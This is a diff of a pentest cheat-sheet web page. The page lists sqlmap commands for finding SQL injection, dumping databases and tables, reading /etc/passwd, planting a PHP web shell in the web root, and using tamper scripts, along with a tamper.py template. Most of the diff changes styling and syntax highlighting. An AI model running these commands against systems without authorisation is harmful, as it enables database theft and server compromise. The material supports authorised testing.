@@ -193,71 +193,195 @@
   <li><a href="https://tldrbins.github.io/@burpsuite/">Burpsuite</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="sqlmap">sqlmap</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In Burp Suite, we can right click the request and click `copy to file` to save the request</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># And add `*` to request to indicate the sql injection point</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In Burp Suite, we can right click the request and click <span class="sb">`</span>copy to file<span class="sb">`</span> to save the request
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> And add <span class="sb">`</span>*<span class="sb">`</span> to request to indicate the sql injection point
 </span></span></code></pre></div></div>
 <br>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTP</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTPS</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --force-ssl
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --string <span class="s1">&#39;Invalid User&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get databases</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --dbs
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get tables</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D &lt;DB_NAME&gt; --tables
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dump table</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D &lt;DB_NAME&gt; -T &lt;TABLE_NAME&gt; --dump
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Dump all tables (slow)</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D &lt;DB_NAME&gt; --dump
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Specify technique</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --technique U
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Initial testing HTTP
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Initial testing HTTPS
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add a string to indicate injection succeed <span class="o">(</span>e.g. Invalid User vs Error Occurred<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string &#39;Invalid User&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get databases
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get tables
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D &lt;DB_NAME&gt; --tables
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Dump table
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D &lt;DB_NAME&gt; -T &lt;TABLE_NAME&gt; --dump
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Dump all tables <span class="o">(</span>slow<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D &lt;DB_NAME&gt; --dump
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Specify technique
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
+</span></span></span></code></pre></div></div>
 <h4 id="technique">Technique</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------------------+
-</span></span><span class="line"><span class="cl">| B: Boolean-based blind |
-</span></span><span class="line"><span class="cl">| E: Error-based         |
-</span></span><span class="line"><span class="cl">| U: Union query-based   |
-</span></span><span class="line"><span class="cl">| S: Stacked queries     |
-</span></span><span class="line"><span class="cl">| T: Time-based blind    |
-</span></span><span class="line"><span class="cl">| Q: Inline queries      |
-</span></span><span class="line"><span class="cl">+------------------------+
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| B: Boolean-based blind |
+</span></span></span><span class="line"><span class="cl"><span class="go">| E: Error-based         |
+</span></span></span><span class="line"><span class="cl"><span class="go">| U: Union query-based   |
+</span></span></span><span class="line"><span class="cl"><span class="go">| S: Stacked queries     |
+</span></span></span><span class="line"><span class="cl"><span class="go">| T: Time-based blind    |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Q: Inline queries      |
+</span></span></span><span class="line"><span class="cl"><span class="go">+------------------------+
+</span></span></span></code></pre></div></div>
 <h4 id="advance-sqlmap">Advance sqlmap</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># File write</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add payload tamper script, e.g. randomcase</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --tamper randomcase
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privileges</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --privileges
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Read a file</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --file-read<span class="o">=</span>/etc/passwd
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Write a file</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request --file-write<span class="o">=</span>./test.txt --file-dest<span class="o">=</span>/tmp/test.txt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> File write
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add payload tamper script, e.g. randomcase
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check privileges
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --privileges
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Read a file
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --file-read=/etc/passwd
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Write a file
+</span></span><span class="line"><span class="cl"><span class="go">sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
+</span></span></span></code></pre></div></div>
 <h4 id="tamperpy-template">tamper.py template</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
-</span></span><span class="line"><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>!/usr/bin/env python3
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">from lib.core.enums import PRIORITY
+</span></span></span><span class="line"><span class="cl"><span class="go">__priority__ = PRIORITY.NORMAL
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">def dependencies():
+</span></span></span><span class="line"><span class="cl"><span class="go">    pass
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">def tamper(payload, **kwargs):
+</span></span></span><span class="line"><span class="cl"><span class="go">    return payload
+</span></span></span></code></pre></div></div>
 <p><small><em>Note: create an empty __init__.py in the same folder</em></small></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
